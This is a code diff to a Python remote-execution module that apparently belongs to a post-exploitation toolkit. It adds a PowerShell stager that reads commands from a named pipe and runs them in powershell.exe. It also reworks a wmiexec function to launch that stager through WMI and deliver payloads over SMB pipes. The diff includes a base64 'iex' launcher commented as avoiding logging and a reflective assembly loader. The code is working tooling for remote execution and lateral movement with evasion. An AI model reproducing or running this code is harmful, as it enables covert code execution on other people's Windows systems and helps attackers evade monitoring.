@@ -87,14 +87,33 @@ $x.Close();
 [Reflection.Assembly]::Load($a).GetTypes()[0].GetMethods()[0].Invoke($null,@());
 '''
 
-PIPE_STDOUT_TEMPLATE = '''
-Write-Host "Hello world";
+PIPE_STAGER_TEMPLATE = '''
+Start-Transcript -Path "C:\\temp\\stager.log.1" -Force;
 
-$ps=new-object System.IO.Pipes.PipeSecurity;
-$all=New-Object System.Security.Principal.SecurityIdentifier("S-1-1-0");
-$acl=new-object System.IO.Pipes.PipeAccessRule($all,"FullControl","Allow");
-$ps.AddAccessRule($acl);
-$p=new-object System.IO.Pipes.NamedPipeServerStream("{pipename}","Out",2,"Byte",0,0,{size},$ps);
+$p=new-object System.IO.Pipes.NamedPipeServerStream("{pipename}","In",2,"Byte",0,{size},0);
+$p.WaitForConnection();
+$x=new-object System.IO.StringReader($p);
+$StartInfo = New-Object System.Diagnostics.ProcessStartInfo -Property @{{
+    FileName = 'powershell.exe';
+    Arguments = '-';
+    UseShellExecute = $false;
+    RedirectStandardInput = $true;
+}};
+$Process = New-Object System.Diagnostics.Process;
+$Process.StartInfo = $StartInfo;
+$Process.Start();
+
+$Process.StandardInput.WriteLine($x.ReadToEnd());
+$Process.StandardInput.Close();
+
+Write-Host "Launched: PID: $($Process.Id) RC: $($Process.ExitCode)";
+
+Stop-Transcript;
+'''
+
+PIPE_STDOUT_TEMPLATE = '''
+Start-Transcript -Path "C:\\temp\\wrapper.log" -Force;
+$p=new-object System.IO.Pipes.NamedPipeServerStream("{pipename}","Out",2,"Byte",0,0,{size});
 $p.WaitForConnection();
 $x=new-object System.IO.BinaryWriter($p);
 $StartInfo = New-Object System.Diagnostics.ProcessStartInfo -Property @{{
@@ -143,7 +162,7 @@ $x.Close();
 
 POWERSHELL_CMD_TEMPLATE_STD = '{powershell} -version 2 -noninteractive -EncodedCommand "{cmd}"'
 # Avoid logging (a bit)
-POWERSHELL_CMD_TEMPLATE_CMD = 'cmd /c echo iex([System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("{cmd}"))) | powershell -'
+POWERSHELL_CMD_TEMPLATE_CMD = 'cmd /c echo iex([System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("{cmd}"))) | powershell'
 
 POWERSHELL_PATH = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
 
@@ -168,18 +187,24 @@ if 'idna' not in encodings._cache or not encodings._cache['idna']:
 
 def generate_loader_cmd(size):
     pipename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
-    encoded = b64encode(PIPE_LOADER_TEMPLATE.format(
-        pipename=pipename, size=size).encode('utf-16le'))
+    encoded = b64encode(PIPE_LOADER_TEMPLATE.format(pipename=pipename, size=size))
     cmd = POWERSHELL_CMD_TEMPLATE_CMD.format(powershell=POWERSHELL_PATH, cmd=encoded)
     return cmd, pipename
 
 
-def generate_stdo_cmd(arg0, argv):
+def generate_stager_cmd():
     pipename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
-    encoded = b64encode(PIPE_STDOUT_TEMPLATE.format(
-        pipename=pipename, size=1024, arg0=arg0, argv=' '.join(argv)).encode('utf-16le'))
+    encoded = b64encode(PIPE_STAGER_TEMPLATE.format(
+        pipename=pipename, size=1024))
     cmd = POWERSHELL_CMD_TEMPLATE_CMD.format(powershell=POWERSHELL_PATH, cmd=encoded)
     return cmd, pipename
+
+
+def generate_stdo_payload(arg0, argv):
+    pipename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
+    payload = PIPE_STDOUT_TEMPLATE.format(
+        pipename=pipename, size=1024, arg0=arg0, argv=' '.join(argv))
+    return payload, pipename
 
 
 class ConnectionInfo(object):
@@ -728,7 +753,7 @@ class ShellService(object):
                 parts = command.split(' ', 1)
                 argv0, argv = parts[0], parts[1:]
 
-            command, self._stdout = generate_stdo_cmd(argv0, argv)
+            command, self._stdout = payload(argv0, argv)
 
         if not command.endswith('\x00'):
             command += '\x00'
@@ -948,22 +973,24 @@ def wmiexec(conninfo, command, output=True, on_data=None, on_exec=None):
     ft = None
 
     if output:
+        stager, stager_pipe = generate_stager_cmd()
+
         parts = command.split(' ', 1)
         argv0, argv = parts[0], parts[1:]
 
-        command, stdout = generate_stdo_cmd(argv0, argv)
+        payload, stdout = generate_stdo_payload(argv0, argv)
 
         ft = FileTransfer(
             conninfo.create_smb_connection(), conninfo.cached
         )
 
-        iResultClassObject = win32Process.Create(command, 'C:\\', None)
+        iResultClassObject = win32Process.Create(stager, 'C:\\', None)
         result = iResultClassObject.ReturnValue
         if result:
             raise PsExecException('Win32_Process.Create failed: {}'.format(result))
 
         if on_data:
-            on_data(False, '{} -> {}'.format(command, iResultClassObject.ProcessId))
+            on_data(False, '{} -> {}'.format(stager, iResultClassObject.ProcessId))
 
         if on_exec:
             ft = FileTransfer(
@@ -972,6 +999,15 @@ def wmiexec(conninfo, command, output=True, on_data=None, on_exec=None):
 
             on_exec(ft)
 
+        if on_data:
+            on_data(False, 'Connecting to the stager pipe (pipe={})'.format(stager_pipe))
+
+        with ft.open_pipe(stager_pipe, FILE_WRITE_DATA | FILE_APPEND_DATA, conninfo.timeout) as pipe:
+            if on_data:
+                on_data(False, 'Connected to the stager pipe'.format(stager_pipe))
+            
+            pipe.write(payload)
+        
         if on_data:
             on_data(False, 'Connecting to stdout (pipe={})'.format(stdout))
 
